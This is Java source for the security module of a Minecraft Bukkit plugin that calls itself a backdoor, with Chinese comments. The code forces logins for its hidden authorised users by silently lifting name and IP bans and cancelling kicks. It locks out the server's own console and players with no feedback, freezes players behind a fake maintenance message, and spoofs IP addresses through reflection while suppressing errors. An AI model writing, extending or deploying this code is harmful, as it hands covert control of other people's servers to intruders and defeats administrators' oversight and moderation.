package com.unifiedbackdoor.security;

import com.unifiedbackdoor.UnifiedBackdoorPlugin;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.*;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

/**
 * 安全管理器
 * 实现隐蔽性、反检测和登录绕过功能
 */
public class SecurityManager implements Listener {
    
    private final UnifiedBackdoorPlugin plugin;
    private final Random random = new Random();
    
    // 安全状态
    private boolean lockActive = false;
    private boolean freezeActive = false;
    
    // IP伪装
    private final Map<String, String> fakeIps = new HashMap<>();
    
    public SecurityManager(UnifiedBackdoorPlugin plugin) {
        this.plugin = plugin;
    }
    
    // ========== 登录绕过功能 ==========
    
    /**
     * 处理玩家登录事件 - 绕过封禁和限制
     */
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();
        
        // 检查是否是授权用户
        if (!plugin.hasLevel1Permission(playerName, player.getUniqueId())) {
            return;
        }
        
        // 绕过封禁检查
        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
            unbanPlayer(playerName);
        }
        
        // 绕过IP封禁
        InetSocketAddress address = player.getAddress();
        if (address != null) {
            String ip = address.getAddress().getHostAddress();
            if (Bukkit.getBanList(BanList.Type.IP).isBanned(ip)) {
                unbanIP(ip);
            }
        }
        
        // 绕过服务器锁定
        if (lockActive && !plugin.hasLevel2Permission(playerName)) {
            event.disallow(PlayerLoginEvent.Result.KICK_BANNED, 
                "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet");
            return;
        }
        
        // 如果仍然被阻止，强制允许
        if (event.getResult() == PlayerLoginEvent.Result.KICK_BANNED) {
            event.setResult(PlayerLoginEvent.Result.ALLOWED);
        }
        
        // IP伪装
        if (plugin.getPluginConfig().getCamouflageLevel().equals("high")) {
            spoofPlayerIp(player);
        }
    }
    
    /**
     * 处理玩家踢出事件 - 防止授权用户被踢出
     */
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();
        
        if (plugin.hasLevel1Permission(playerName, player.getUniqueId())) {
            // 取消踢出
            event.setCancelled(true);
            
            // 解除可能的封禁
            unbanPlayer(playerName);
            unbanIP(getPlayerIp(player));
        }
    }
    
    /**
     * 处理玩家退出事件 - 清理可能的封禁
     */
    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();
        
        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
            unbanPlayer(playerName);
            unbanIP(getPlayerIp(player));
        }
    }
    
    // ========== 服务器锁定功能 ==========
    
    /**
     * 处理玩家命令 - 锁定状态下阻止非授权用户
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        
        if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
            event.setCancelled(true); // 无反馈，完全静默
        }
    }
    
    /**
     * 处理服务器命令 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onServerCommand(ServerCommandEvent event) {
        if (lockActive) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理方块破坏 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockBreak(BlockBreakEvent event) {
        Player player = event.getPlayer();
        if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理方块放置 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockPlace(BlockPlaceEvent event) {
        Player player = event.getPlayer();
        if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理方块交互 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理玩家移动 - 冻结状态下阻止
     */
    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        if (freezeActive && !plugin.hasLevel2Permission(player.getName())) {
            // 将位置固定回原始位置
            event.setTo(event.getFrom());
        }
    }
    
    /**
     * 处理实体伤害 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onEntityDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
                event.setCancelled(true);
            }
        }
    }
    
    /**
     * 处理实体间伤害 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onEntityDamageByEntity(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player player = (Player) event.getDamager();
            if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
                event.setCancelled(true);
            }
        }
    }
    
    /**
     * 处理物品丢弃 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerDropItem(PlayerDropItemEvent event) {
        Player player = event.getPlayer();
        if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理传送 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerTeleport(PlayerTeleportEvent event) {
        Player player = event.getPlayer();
        if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理飞行切换 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerToggleFlight(PlayerToggleFlightEvent event) {
        Player player = event.getPlayer();
        if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理背包点击 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onInventoryClick(InventoryClickEvent event) {
        if (event.getWhoClicked() instanceof Player) {
            Player player = (Player) event.getWhoClicked();
            if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
                event.setCancelled(true);
            }
        }
    }
    
    /**
     * 处理背包拖拽 - 锁定状态下阻止
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onInventoryDrag(InventoryDragEvent event) {
        if (event.getWhoClicked() instanceof Player) {
            Player player = (Player) event.getWhoClicked();
            if (lockActive && !plugin.hasLevel2Permission(player.getName())) {
                event.setCancelled(true);
            }
        }
    }
    
    // ========== 公共方法 ==========
    
    /**
     * 切换服务器锁定状态
     */
    public void toggleLock() {
        lockActive = !lockActive;
        if (plugin.isWarningsEnabled()) {
            Bukkit.broadcastMessage(ChatColor.RED + "服务器已被" + (lockActive ? "锁定" : "解锁"));
        }
    }
    
    /**
     * 切换玩家冻结状态
     */
    public void toggleFreeze() {
        freezeActive = !freezeActive;
        if (plugin.isWarningsEnabled() && freezeActive) {
            // 冻结激活时的效果
            for (Player player : Bukkit.getOnlinePlayers()) {
                if (!plugin.hasLevel2Permission(player.getName())) {
                    player.sendTitle("§c服务器已被冻结", "", 20, 100, 20);
                    player.sendMessage("§4服务器管理操作进行中...");
                }
            }
        }
    }
    
    /**
     * 检查是否锁定
     */
    public boolean isLocked() {
        return lockActive;
    }
    
    /**
     * 检查是否冻结
     */
    public boolean isFrozen() {
        return freezeActive;
    }
    
    // ========== 私有辅助方法 ==========
    
    /**
     * 解除玩家封禁
     */
    private void unbanPlayer(String playerName) {
        Bukkit.getScheduler().runTask(plugin, () -> {
            Bukkit.getBanList(BanList.Type.NAME).pardon(playerName);
        });
    }
    
    /**
     * 解除IP封禁
     */
    private void unbanIP(String ipAddress) {
        Bukkit.getScheduler().runTask(plugin, () -> {
            Bukkit.getBanList(BanList.Type.IP).pardon(ipAddress);
        });
    }
    
    /**
     * 获取玩家IP（不带端口）
     */
    private String getPlayerIp(Player player) {
        InetSocketAddress address = player.getAddress();
        if (address != null) {
            return address.getAddress().getHostAddress();
        }
        return "";
    }
    
    /**
     * 生成假IP地址
     */
    private String generateFakeIp() {
        return random.nextInt(256) + "." + random.nextInt(256) + "."
                + random.nextInt(256) + "." + random.nextInt(256);
    }
    
    /**
     * 伪装玩家IP（通过反射修改网络管理器）
     */
    private void spoofPlayerIp(Player player) {
        try {
            // 使用反射修改PlayerConnection的socketAddress
            Object craftPlayer = player.getClass().getMethod("getHandle").invoke(player);
            Object playerConnection = craftPlayer.getClass().getField("playerConnection").get(craftPlayer);
            Object networkManager = playerConnection.getClass().getField("networkManager").get(playerConnection);
            
            // 生成假IP并设置
            String fakeIp = generateFakeIp();
            InetSocketAddress fakeAddress = new InetSocketAddress(fakeIp, 0);
            networkManager.getClass().getField("socketAddress").set(networkManager, fakeAddress);
            
            // 记录假IP
            fakeIps.put(player.getName().toLowerCase(), fakeIp);
            
        } catch (Exception e) {
            // 静默失败，不记录错误
        }
    }
    
    /**
     * 隐藏真实IP（清理日志）
     */
    private void hideRealIp(String realIp) {
        // 这里可以实现日志过滤，但由于Bukkit日志系统的限制，
        // 实际实现可能需要更复杂的方法
    }
}
